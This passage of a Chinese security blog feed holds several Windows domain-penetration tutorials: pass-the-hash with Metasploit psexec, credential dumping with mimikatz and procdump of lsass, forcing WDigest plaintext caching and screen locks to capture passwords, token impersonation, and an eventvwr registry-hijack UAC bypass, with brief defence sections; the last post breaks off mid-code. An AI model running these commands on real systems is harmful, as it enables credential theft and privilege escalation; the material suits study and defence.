src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160306.png" alt="image-20210214152128620"></p><p>会弹出一个交互式的终端,这个终端以及伪造为我们指定的hash和用户，可以直接访问smb服务，我们可以通过copy文件，然后执行计划任务去拿到shell（使用atexec攻击）。</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160310.png" alt="image-20210214152835360"></p><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>需要使用<code>exploit/windows/smb/psexec</code></p><p>注意这里填入的哈希是<code>LM Hash:NTLM Hash</code>, 当系统默认不支持LM hash，LM hash可以设定为任意值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apl">use exploit&#x2F;windows&#x2F;smb&#x2F;psexec<br>set payload windows&#x2F;meterpreter&#x2F;bind_tcp<br>set RHOST 172.16.27.10<br>set smbuser administrator<br>set SMBPass 00000000000000000000000000000000:4075bdc2e63781b034a034102356063a<br>run<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160316.png" alt="image-20210214154108503"></p><p>当然还有一些其它利用方法，比如：Cobalt Strike 抓取、powershell读取、 SAM表离线获取hash、wmiexec利用hash获取shell等等</p><h2 id="0x03-防范措施"><a href="#0x03-防范措施" class="headerlink" title="0x03 防范措施"></a>0x03 防范措施</h2><h3 id="KB2871997补丁的影响"><a href="#KB2871997补丁的影响" class="headerlink" title="KB2871997补丁的影响"></a>KB2871997补丁的影响</h3><p>防范首先想到打补丁，微软也早在2014年5月发布了KB2871997补丁，该补丁禁止通过本地管理员权限与远程计算机进行连接，其后果就是：无法通过本地管理员权限对远程计算机使用Psexec、WMI、smbecec等，也无法访问远程的文件共享等。</p><p>但实际上就算打了KB2871997补丁后，Administrator账号(SID为500)也是例外的，使用该账户的NTLM Hash依然可以进行哈希传递。</p><blockquote><p>  KB2871997补丁并不能真正防止哈希传递，只是在一定程度上缓解了PTH的问题。</p><p>  浅探内网横向移动-Pass The Hash  <a href="https://xz.aliyun.com/t/8117#toc-11">https://xz.aliyun.com/t/8117#toc-11</a></p><p>  KB22871997是否真的能防御PTH攻击？<a href="https://www.anquanke.com/post/id/193150">https://www.anquanke.com/post/id/193150</a></p></blockquote><h3 id="防御-mimikatz-攻击"><a href="#防御-mimikatz-攻击" class="headerlink" title="防御 mimikatz 攻击"></a>防御 mimikatz 攻击</h3><p>mimikatz在抓取散列值或明文密码时，需要用到Debug权限（因为mimikatz需要和lsass进程进行交互，如果没有Debug权限，mimikatz将不能读取lsass进程里的密码）。而Debug权限归本地管理员Administrator所有,目的是确定哪些用户可以将调试器附加到任何进程或内核中，但一般Administrator不会用到这个权限(除非是系统进程)。<br><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160322.png" alt="image-20210214155950651"></p><p>所以在配置用户权限时，可以将拥有Debug权限的本地管理员从Administrator组中移除。重启系统之后，在运行mimikatz，在第一步”privilege::debug”时就会报错了。</p>]]></content>
    
    
    <categories>
      
      <category>域渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows提权</tag>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows系统散列值获取</title>
    <link href="/2021/02/07/Windows%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96/"/>
    <url>/2021/02/07/Windows%E7%B3%BB%E7%BB%9F%E6%95%A3%E5%88%97%E5%80%BC%E8%8E%B7%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<blockquote><p>  明年今日，人生一大喜事(≧∇≦)ﾉ  弱弱问一句我很胖吗？183 165</p></blockquote><h1 id="Windows系统散列值获取"><a href="#Windows系统散列值获取" class="headerlink" title="Windows系统散列值获取"></a>Windows系统散列值获取</h1><h2 id="0x01-LM-Hash与NTLM-Hash"><a href="#0x01-LM-Hash与NTLM-Hash" class="headerlink" title="0x01 LM Hash与NTLM Hash"></a>0x01 LM Hash与NTLM Hash</h2><p>Windows操作系统通常使用两种方法对用户的明文密码进行加密处理。在域环境中，用户信息存储在<code>ntds.dit</code>中，加密后为散列值。</p><p>Windows操作系统中的密码一般由两部分组成，一部分为LM Hash，另一部分为NTLM Hash。在Windows操作系统中，Hash的结构通常如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">username:RID:LM-HASH:NT-HASH<br></code></pre></td></tr></table></figure><blockquote><p>  LM Hash的全名为”LAN Manager Hash”，是微软为了提高Windows操作系统的安全性而采用的散列值加密算法，其本质是DES加密。尽管LM Hash比较容易破解，但是为了保证系统的兼容性，Windows只是将LM Hash禁用了（从 Windows Vista 和 Windows 2008 版本开始禁用）。如果LM Hash被禁用了，攻击者通过工具抓取的LM Hash值通常是”aad3b435b51404eeaad3b435b51404ee”(表示LM Hash值为空或者被禁用)。</p><p>  NTLM Hash是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法。NTLM Hash是基于MD4加密算法进行加密的。个人版从Windows Vista 以后，服务器版从Windows Server 2003以后，Windows操作系统的认证方式均为NTLM Hash。</p></blockquote><h2 id="0x02-散列值获取方法"><a href="#0x02-散列值获取方法" class="headerlink" title="0x02 散列值获取方法"></a>0x02 散列值获取方法</h2><p>要想在Windows操作系统中抓取散列值或明文密码，必须将权限升级至System。本地用户名，散列值和其它安全验证信息都保存在SAM文件中。lsass.exe进程(它用于本地安全和登陆策略)用于实现Windows的安全策略，可以使用工具将散列值和明文密码从内存中的lsass.exe进程或SAM文件中导出。</p><p>利用前提：拿到了管理员权限的cmd，管理员用密码登录过机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中。</p><p>在<strong>KB2871997</strong>之前， 使用 Mimikatz 可以直接抓取明文密码。</p><p>当服务器安装 <strong>KB2871997</strong> 补丁后，系统默认禁用 Wdigest Auth（<strong>Windows 2012及以上版本</strong>） ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。<br>    但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）之后通过手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录 = 截取明文密码</p><h3 id="使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）"><a href="#使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）" class="headerlink" title="使用mimikatz在线读取SAM文件（目标没有杀软，或者mimikatz已免杀）"></a>使用mimikatz在线读取SAM文件（目标没有杀软，或者<code>mimikatz</code>已免杀）</h3><p>直接将<code>mimikatz</code>上传至目标机器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot;    #在线读取散列值及铭文密码<br></code></pre></td></tr></table></figure><p>该操作需要管理员权限，否则报错，无法读取密码，报错信息如下</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210207221939.png" alt="image-20210207221937863"></p><p>管理员权限执行</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210207221945.png" alt="image-20210207221846491"></p><h4 id="使用mimikatz离线读取lsass-dmp文件（mimikatz被杀软拦截）"><a href="#使用mimikatz离线读取lsass-dmp文件（mimikatz被杀软拦截）" class="headerlink" title="使用mimikatz离线读取lsass.dmp文件（mimikatz被杀软拦截）"></a>使用mimikatz离线读取lsass.dmp文件（mimikatz被杀软拦截）</h4><p>（1）导出<code>lsass.dmp</code>文件</p><p>通过 <code>procdump.exe</code> 文件导出<code>lsass.dmp</code>文件（Procdump是微软官方发布的工具，可以在命令行下将目标lsass文件导出，且杀毒软件不会拦截）</p><p><code>procdump</code>下载地址：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a></p><p><strong>管理员权限运行</strong>该命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">procdump.exe -accepteula -ma lsass.exe lsass.dmp<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210207215155.png" alt="image-20210207214123607"></p><p>(2）使用mimikatz导出lsass.dmp文件中的密码散列值</p><p>将目标机器上的 <code>lsass.tmp</code> 拉取到本地，与<code>mimikatz</code>同目录，使用<code>mimikatz</code>解密目标系统密码。（本地机器需与目标机器的版本位数一致）</p><p>运行mimikatz.exe 解密该文件。注：32位就用32位的<code>mimikatz</code>破解，同理64位的也是。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">sekurlsa::minidump lsass.dmp<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210207213854.png" alt="image-20210207213852318"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">sekurlsa::logonpasswords full<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210207214737.png" alt="image-20210207214733408"></p><h4 id="mimikatz无法读取到密码时"><a href="#mimikatz无法读取到密码时" class="headerlink" title="mimikatz无法读取到密码时"></a>mimikatz无法读取到密码时</h4><p>在默认情况下，当系统为<strong>Windows 2012R2</strong>以上或者安装 <strong>KB2871997</strong> 补丁时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，此时可以通过以下方式开启，但需要用户重新登录后才能成功抓取。</p><p><strong>开启Wdigest Auth</strong></p><ul><li><p>cmd</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<br></code></pre></td></tr></table></figure></li><li><p>powershell</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1<br></code></pre></td></tr></table></figure></li><li><p>meterpreter</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1<br></code></pre></td></tr></table></figure></li></ul><p><strong>关闭Wdigest Auth</strong></p><p>关闭命令如下：</p><ul><li><p>cmd</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f<br></code></pre></td></tr></table></figure></li><li><p>powershell</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0<br></code></pre></td></tr></table></figure></li><li><p>meterpreter</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0<br></code></pre></td></tr></table></figure></li></ul><p><strong>强制锁屏</strong></p><p>在开启 <code>Wdigest Auth</code> 后，需要管理员重新登录才能抓明文密码。</p><p>强制锁屏，让管理员重新登录。</p><ul><li><p>cmd</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">rundll32 user32.dll,LockWorkStation<br></code></pre></td></tr></table></figure><p>  等待管理员重新登录，之后重新读取，可读到明文密码。</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>域渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows提权</tag>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>令牌窃取分析及防范</title>
    <link href="/2021/01/29/%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83/"/>
    <url>/2021/01/29/%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83/</url>
    
    <content type="html"><![CDATA[<blockquote><p>  快过年了，小伙伴们提议出去浪一下，决定要去玩恐怖类密室逃脱，瑟瑟发抖o((⊙﹏⊙))o.</p></blockquote><h2 id="令牌窃取分析及防范"><a href="#令牌窃取分析及防范" class="headerlink" title="令牌窃取分析及防范"></a>令牌窃取分析及防范</h2><h2 id="0x01-令牌概述"><a href="#0x01-令牌概述" class="headerlink" title="0x01 令牌概述"></a>0x01 令牌概述</h2><p>令牌( Token )是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的。获得了令牌，就可以在不提供密码或其他凭证的情况下访问网络和系统资源。这些令牌将持续存在于系统中(除非系统重新启动)。</p><p>令牌的最大特点是随机性和不可预测性，一般的攻击者或软件都无法将令牌猜测出来。令牌一般分为以下几种：</p><ul><li>  访问令牌(Access Token) 代表访问控制操作主体的系统对象。(本文主要讲Windows的AccessToken)</li><li>  密保令牌(Security Token) 也叫作认证令牌或者硬件令牌，是一种用于实现计算机身份校验的物理设备，例如U盾。</li><li>  会话令牌 ( SessionToken)是交互会话中唯一的身份标识符。</li></ul><h4 id="Windows访问令牌"><a href="#Windows访问令牌" class="headerlink" title="Windows访问令牌"></a>Windows访问令牌</h4><p>Windows 访问令牌(Access Tokens) 是一个描述进程或线程安全上下文的对象。令牌所包含的信息是与该用户账户相关的进程或线程的身份和权限信息。当用户登录时，系统通过将用户输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统将生成一个访问令牌。之后，该用户执行的每个进程都会拥有一个该访问令牌的副本。</p><p>目前访问令牌分为两种令牌：</p><ul><li>  主令牌（每一个进程都具有一个唯一的主令牌，进程通过主令牌被开启）</li><li>  模拟令牌（在默认的情况下，当线程被开启的时候，所在进程的主令牌会自动附加到当前线程上，作为线程的安全上下文。而线程可以运行在另一个非主令牌的访问令牌下执行，而这个令牌被称为模拟令牌。而指定线程的模拟令牌的过程被称为模拟）</li></ul><p>主令牌是与进程相关的；模拟的令牌是与模拟令牌的线程相关的。主令牌和模拟令牌，都会在系统重启或者关机后全部清除。</p><p>当线程与安全对象进行交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户。访问令牌包含以下信息：</p><ul><li>  用户帐户的安全标识符(SID)</li><li>  用户帐户所属的用户群的SIDs</li><li>  一个logon SID，标识当前登录会话</li><li>  用户或用户群的特权清单</li><li>  所有者的SID</li><li>  基本群的SID</li><li>  当用户创建可安全对象（securable object）且没有给出安全描述符时，系统使用的缺省的自主访问控制列表（DACL）</li><li>  访问令牌资源</li><li>  是否为primary或impersonation token</li><li>  限制性SIDs的可选列表</li><li>  当前impersonation级别</li><li>  其他统计</li></ul><p>攻击者可以使用访问令牌在不同的用户或系统安全性上下文下进行操作，以执行操作并逃避检测。</p><p>攻击者可以使用内置的Windows API函数来复制现有进程中的访问令牌。这被称为令牌窃取。</p><p>攻击者必须已经在特权用户上下文（即管理员）中才能窃取令牌。攻击者通常使用令牌窃取将其安全上下文从管理员级别提升到SYSTEM级别。如果帐户对远程系统具有适当的权限，则对手可以使用令牌作为该令牌的帐户向远程系统进行身份验证。</p><p><strong>列举令牌只能列出当前用户和比当前用户权限更低用户的令牌，例如当前权限是system或者是administrator，那么我们就可以看到系统中所有的令牌。</strong></p><h2 id="0x02-令牌窃取"><a href="#0x02-令牌窃取" class="headerlink" title="0x02 令牌窃取"></a>0x02 令牌窃取</h2><h5 id="使用MSF中的-incognito-插件"><a href="#使用MSF中的-incognito-插件" class="headerlink" title="使用MSF中的 incognito 插件"></a>使用MSF中的 incognito 插件</h5><p>由于我当前的权限是一个普通用户，所以令牌窃取只能窃取到当前用户本身</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085126.png" alt="image-20210129091617259"></p><p>利用上一节<strong>Windows提权-BypassUAC之劫持注册表实验</strong> ，使用UAC提权，先另起一个MSF监听，然后在本sessoin中的shell中执行</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic">reg add &quot;HKCU\Software\Classes\mscfile\shell\open\command&quot; /d c:\testftp\shell.exe /f<br><br>eventvwr.exe<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085131.png" alt="image-20210128223604660"></p><blockquote><p>  Delegation Token：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问)</p><p>   Impresonation Token：模拟令牌，它是非交互的会话。</p></blockquote><p>得到授权令牌：        </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apl">NT AUTHORITY\IUSR<br>NT AUTHORITY\LOCAL SERVICE<br>NT AUTHORITY\NETWORK SERVICE<br>NT AUTHORITY\SYSTEM<br>TEST\Administrator<br>TEST\yhy<br></code></pre></td></tr></table></figure><p>得到模拟令牌：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">NT AUTHORITY\ANONYMOUS LOGON<br></code></pre></td></tr></table></figure><p>伪造授权令牌，就可以拥有它的权限了，使用下面命令获取对应token的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">impersonate_token &#39;TEST\Administrator&#39;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085137.png" alt="image-20210128223730735"></p><p>使用<code>drop_token</code>返回之前的token，和 <code>rev2self</code> 一样</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085141.png" alt="image-20210128223804482"></p><p>Windows 访问令牌是用户登录后分配的用于标识用户权限的对象，通过复制令牌，我们可以摸拟该令牌代表的用户。典型的用法是获取 SYSTEM 权限，以及查看本机是否有域控账号的令牌，然后窃取该令牌，从而控制整个域。</p><h2 id="0x03-令牌窃取提权的防御措施"><a href="#0x03-令牌窃取提权的防御措施" class="headerlink" title="0x03 令牌窃取提权的防御措施"></a>0x03 令牌窃取提权的防御措施</h2><p>针对令牌窃取提权的防御措施如下：</p><ul><li>  为了防止域管理员的令牌被窃取，应该禁止域管理员登录其它主机。如果登录了，使用完后应该及时重启电脑，从而把令牌清除。</li><li>  及时安装微软推送的补丁</li><li>  对于来路不明的或者危险的软件，既不要在系统中使用，也不要在虚拟机中使用</li><li>  对令牌的时效性进行限制，以防止散列值被破解后泄露有效的令牌信息</li><li>  对于令牌，应采取加密存储及多长验证保护</li><li>  使用加密链路SSL/TLS传输令牌，以防止被中间人窃听</li></ul>]]></content>
    
    
    <categories>
      
      <category>域渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows提权</tag>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows提权-BypassUAC之劫持注册表实验</title>
    <link href="/2021/01/19/Windows%E6%8F%90%E6%9D%83-BypassUAC%E4%B9%8B%E5%8A%AB%E6%8C%81%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%AE%9E%E9%AA%8C/"/>
    <url>/2021/01/19/Windows%E6%8F%90%E6%9D%83-BypassUAC%E4%B9%8B%E5%8A%AB%E6%8C%81%E6%B3%A8%E5%86%8C%E8%A1%A8%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<blockquote><p>  准备PPT的过程中，还是学到不少东西的</p></blockquote><h3 id="1-UAC-简介"><a href="#1-UAC-简介" class="headerlink" title="1. UAC 简介"></a>1. UAC 简介</h3><p>**UAC(User Account Control，用户账号控制)**是微软为了提高系统安全性在Windows Vista中引入的技术。UAC要求用户在执行可能影响计算机运行的操作或在进行可能影响其他用户的设置之前，拥有相应的权限或者管理员密码。UAC在操作启动前对用户身份进行验证，以避免恶意软件和间谍软件在未经许可的情况下在计算机上进行安装操作或者对计算机设置进行更改。</p><p>在Windows Vista及以后的版本中，微软设置了安全控制策略，分为高、中、低三个等级。高等级的进程有管理员权限；中等级的进程有普通用户权限；低等级的进程，权限是有限的，以保证系统在受到安全威胁时造成的损害最小。在权限不够的情况下，访问系统磁盘的根目录( 例如 C:\)、Windows目录，以及读写系统登录数据库等操作，都需要经常UAC(User Account Control，用户账号控制)的认证，如图所示：</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084909.png" alt="image-20210118155254114"></p><p><strong>需要UAC的授权才能进行的操作列表如下：</strong></p><ul><li>  配置Windows Update</li><li>  增加、删除账户</li><li>  更改账户类型</li><li>  更改UAC的设置</li><li>  安装ActiveX</li><li>  安装、卸载程序</li><li>  安装设备驱动程序</li><li>  将文件移动/复制到Program Files或Windows目录下</li><li>  查看其它用户的文件夹</li><li>  …</li></ul><p><strong>UAC有如下四种设置要求：</strong></p><ul><li><p>  始终通知：这是最严格的设置，每当有程序需要使用高级别的权限时都会提示本地用户</p></li><li><p>  仅在程序试图更改我的计算机时通知我：这是UAC的默认设置。当本地Windows程序要使用高级别的权限时，不会通知用户。但是，当第三方程序要使用高级别的权限时，会提示本地用户</p></li><li><p>  仅在程序试图更改我的计算机时通知我(不降低桌面的亮度)：与上一条设置的要求相同，但在提示用户时不降低桌面的亮度</p></li><li><p>从不提示：当用户为系统管理员时，所有程序都会以最高权限运行</p><p>  <img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084914.png" alt="image-20210119212303742"></p></li></ul><h3 id="2-利用系统自带的UAC白名单程序提权"><a href="#2-利用系统自带的UAC白名单程序提权" class="headerlink" title="2. 利用系统自带的UAC白名单程序提权"></a>2. 利用系统自带的UAC白名单程序提权</h3><p>用户账户控制限制着程序使用高级权限才能进行的操作，但是，UAC同样也会对系统本身的程序造成影响，微软也不希望运行系统程序也需要询问用户，因为系统程序是安全的。因此，微软则在 UAC 中添加了白名单机制，即在系统中记录有一张表单，表单中的系统程序，将不限制其直接提升到管理员权限。 系统中的白名单程序有多个，其中，msconfig、taskmgr、perfmon、cleanmgr 等平时常用的程序都在其中。操作系统的UAC白名单程序，默认以管理员权限运行，而且不弹出UAC窗口确认。这些白名单程序，都具有微软的签名是操作系统可信的。</p><p>所以我们可以找一些以高权限运行的，但是并没有uac提示的进程，然后利用ProcessMonitor寻找他启动调用却缺失的如dll、注册表键值，然后我们添加对应的值达到bypass uac的效果。</p><p>以高权限运行的进程图标一般有如下标志：</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084919.png" alt="image-20210119104903074"></p><h3 id="3-怎么找这些白名单程序"><a href="#3-怎么找这些白名单程序" class="headerlink" title="3. 怎么找这些白名单程序"></a>3. 怎么找这些白名单程序</h3><p>白名单程序都有一个特性，就是它们都具有autoElevate属性，该属性可由特定工具查看。</p><p>利用微软自带工具检测程序是否具有autoElevate属性，以eventvwr.exe为例，该程序位于C:\Windows\System32目录下。使用微软的Sigcheck工具去查看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">Sigcheck.exe：https:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-cn&#x2F;sysinternals&#x2F;downloads&#x2F;sigcheck<br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">sigcheck64.exe -m C:\Windows\System32\eventvwr.exe<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084934.png" alt="image-20210119143254956"></p><p>利用(Strings.exe](<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings)%E5%B7%A5%E5%85%B7%E6%89%BE%E5%87%BA%E6%89%80%E6%9C%89%E5%85%B7%E6%9C%89autoElevate%E5%B1%9E%E6%80%A7%E7%9A%84%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%B0%86strings.exe%E6%94%BE%E5%9C%A8C:/Windows/System32%E7%9B%AE%E5%BD%95%E4%B8%8B">https://docs.microsoft.com/zh-cn/sysinternals/downloads/strings)工具找出所有具有autoElevate属性的程序，将strings.exe放在C:\Windows\System32目录下</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">strings.exe -s *.exe | findstr &#x2F;i autoelevate<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220084950.png" alt="image-20210119144326844"></p><p>系统在调用这些高权限程序时，会调用<code> HKCR（ HKEY_CLASSES_ROOT）</code>下的键值。 所以，修改<code> HKCR（ HKEY_CLASSES_ROOT）</code>下的键值，把原本的键值改为 cmd.exe 等 shell 程序。如果高权限的程序，在运行过程中调用此处被修改过的键值，就会以高权限启动我们设定的程序。从而实现绕过 UAC提权。难点在于找到注册表的关键位置。</p><h3 id="4-如何找对应的注册表？以事件查看器（eventvwr-为例"><a href="#4-如何找对应的注册表？以事件查看器（eventvwr-为例" class="headerlink" title="4. 如何找对应的注册表？以事件查看器（eventvwr)为例"></a>4. 如何找对应的注册表？以事件查看器（eventvwr)为例</h3><p>接下来使用 <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmon">Process Monitor</a> 工具来查看eventvwr运行时，会调用哪些文件、查询哪些注册表地址。（win7 上无法使用 提示： unable to load Process Monitor device driver，需要更新下面这个补丁即可：<a href="https://www.microsoft.com/en-us/download/confirmation.aspx?id=46148%EF%BC%89">https://www.microsoft.com/en-us/download/confirmation.aspx?id=46148）</a></p><p>1、打开Process Monitor工具后，设置过滤规则，选择工具栏”Filter” ==&gt; “Filter…”</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085000.png" alt="image-20210119160455408"></p><p>设置过滤规则，”Process Name” “is” “eventvwr.exe”，然后点击Add添加规则，之后点击Apply应用和OK即可</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085005.png" alt="image-20210119160612340"></p><p>运行eventvwr.exe，之后查看Process Monitor ，会出现一堆东西，而且右键Properties 可以看到<code>eventvwr.exe</code>权限为 <code>high</code></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085012.png" alt="image-20210119161656625"></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085019.png" alt="image-20210119164141166"></p><p>难点就在于从这一堆东西中找到注册表的关键位置，这里我也并不熟悉，通过查找搜索，发现关键点为：</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">HKCU<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\C</span>lasses<span class="hljs-symbol">\m</span>scfile<span class="hljs-symbol">\s</span>hell<span class="hljs-symbol">\o</span>pen<span class="hljs-symbol">\c</span>ommand<br>HKCR<span class="hljs-symbol">\m</span>scfile<span class="hljs-symbol">\s</span>hell<span class="hljs-symbol">\o</span>pen<span class="hljs-symbol">\c</span>ommand<br></code></pre></td></tr></table></figure><p>在进程 <code>eventvwr.exe</code> 启动的时候，首先查找注册表位置 <code>HKCU\Software\Classes\mscfile\shell\open\command</code>。如果该处为空，接着查找注册表位置 <code>HKCR\mscfile\shell\open\command</code>(此处默认值为 <code>%SystemRoot%\system32\mmc.exe &quot;%1&quot; %*</code>)，以高权限启动 <code>mmc.exe</code>，最后打开 <code>eventvwr.msc</code>。</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210220085025.png" alt="image-20210119211043232"></p><p>这里由结果向原因推导：发现关键字，<code>shell</code> 、<code>command</code> </p><p>搞站不就是拿shell，执行命令，这里不就是执行命令的点吗？！</p><h4 id="4-1-测试"><a href="#4-1-测试" class="headerlink" title="4.1 测试"></a>4.1 测试</h4><p>如果修改键值 <code>HKCU\Software\Classes\mscfile\shell\open\command</code>，使其查询结果为 <code>SUCCESS</code>，会如何呢？</p><p>首先需要修改键值 <code>HKCU\Software\Classes\mscfile\shell\open\command</code>，为测试可以把值改为 <code>calc.exe</code>， 打开运行，执行regedit</p><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nsis">注册表内：<br>    <span class="hljs-params">HKCU</span> = <span class="hljs-params">HKEY_CURRENT_USER</span><br>    <span class="hljs-params">HKLM</span> = <span class="hljs-params">HKEY_LOCAL_MACHINE</span><br>    <span class="hljs-params">HKCR</span> = 